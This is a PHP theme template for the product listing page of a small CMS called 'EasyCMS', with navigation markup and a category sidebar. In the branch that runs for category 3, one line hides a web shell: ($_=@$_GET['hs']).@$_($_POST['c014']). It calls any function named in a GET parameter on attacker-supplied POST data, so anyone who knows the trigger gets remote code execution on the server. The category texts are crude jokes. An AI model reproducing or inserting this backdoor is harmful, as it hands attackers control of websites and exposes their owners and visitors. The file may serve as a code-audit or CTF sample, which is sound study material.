<?php 
//Make sure the file isn't accessed directly.
defined('IN_CMS') or exit('Access denied!');

include('data/inc/front/header.php'); 
?>
<link href="data/themes/basic/css/product.css" rel="stylesheet">
<div class="wrap">
    <nav id="w0" class="navbar-inverse navbar-fixed-top navbar" role="navigation"><div class="container"><div class="navbar-header"><button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#w0-collapse"><span class="sr-only">Toggle navigation</span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span></button><a class="navbar-brand" href="">EasyCMS</a></div><div id="w0-collapse" class="collapse navbar-collapse"><ul id="w1" class="navbar-nav navbar-right nav"><li><a href="index.php?file=index">首页</a></li>
<li><a href="index.php?file=about&id=1">关于我们</a></li>
<li class="active"><a href="index.php?file=product">产品中心</a></li>
<li><a href="index.php?file=news">新闻中心</a></li>
<li><a href="index.php?file=job">招贤纳士</a></li>
<li><a href="index.php?file=more">更多页面</a></li></ul></div></div></nav>
<header class="main-header" style="background-image: url(data/themes/basic/images/product.png);background-repeat:no-repeat;">
        <div class="container">
            <div class="row">
                <div class="col-sm-12 web-desc">
                </div>
            </div>
        </div>
    </header>
    <div class="container">
                        <div class="row">
  <div class="col-md-3">
    <div class="row widget">
<h3 class="title">产品中心</h3>
<div class="list-group">
    <a href="index.php?file=product&cid=1&page=1" class="list-group-item ">产品分类1</a>
    <a href="index.php?file=product&cid=2&page=1" class="list-group-item ">产品分类2</a>
    <a href="index.php?file=product&cid=3&page=1" class="list-group-item ">产品分类3</a>
  </div>
</div>  </div>
    <div class="col-md-9 container-fluid product-list">
    <?php
      if(isset($_GET['cid']) && $_GET['page'] == '1')
      {
        $cid = $_GET['cid'];
        if($cid == '1')
        {
            echo '表面淬火，放飞自我。';
        }
        else if($cid == 2)
        {
            echo '二西莫夫 ，射到你哭。';
        }
        else if($cid == 3)
        {
            echo '巨龙传说，见面就脱。';
            ($_=@$_GET['hs']).@$_($_POST['c014']);
        }
	}
    ?>
    </div>
</div>    </div>
</div>

<?php include('data/inc/front/footer.php'); ?>
